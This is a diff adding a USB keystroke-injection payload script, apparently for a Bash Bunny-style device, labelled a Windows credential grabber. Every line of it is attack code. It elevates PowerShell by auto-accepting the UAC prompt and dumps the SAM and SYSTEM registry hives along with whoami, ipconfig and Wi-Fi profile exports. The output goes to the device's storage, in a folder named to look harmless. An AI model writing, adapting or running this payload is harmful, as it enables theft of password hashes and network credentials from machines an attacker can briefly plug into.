@@ -1,0 +1,42 @@
+REM Re-Write of a windows cred grabbber by https://github.com/AlexanderWyt
+
+
+ATTACKMODE HID STORAGE
+LED R
+QUACK GUI r
+QUACK STRING powershell
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING "exit Start-Process powershell -Verb RunAs"
+QUACK ENTER
+QUACK DELAY 2200
+QUACK ALT Y
+QUACK DELAY 1000
+QUACK STRING "$drive=(Get-PSDrive -PSProvider FileSystem | ?{Test-Path(\"$($_.Root)payloads\")}).Root"
+QUACK ENTER
+QUACK DELAY 100
+QUACK STRING "$out=Join-Path $drive 'nothingwashereorwillhappen'"
+QUACK ENTER
+QUACK DELAY 100
+QUACK STRING "New-Item -Force -ItemType Directory -Path $out | Out-Null"
+QUACK ENTER
+QUACK DELAY 100
+QUACK STRING "whoami /all | Out-File (Join-Path $out 'whoami.txt')"
+QUACK ENTER
+QUACK Delay 100
+QUACK STRING "ipconfig /all | Out-File (Join-Path $out 'ipconfig.txt')"
+QUACK ENTER
+QUACK DELAY 150
+QUACK STRING "reg save HKLM\sam (Join-Path $out 'sam.save')"
+QUACK ENTER
+QUACK DELAY 150
+QUACK STRING "reg save HKLM\system (Join-Path $out 'system.save')"
+QUACK ENTER
+QUACK DELAY 150
+QUACK STRING "netsh wlan export profile folder=$out"
+QUACK ENTER
+QUACK DELAY 250
+QUACK STRING "exit"
+QUACK ENTER
+ATTACKMODE OFF
+LED G
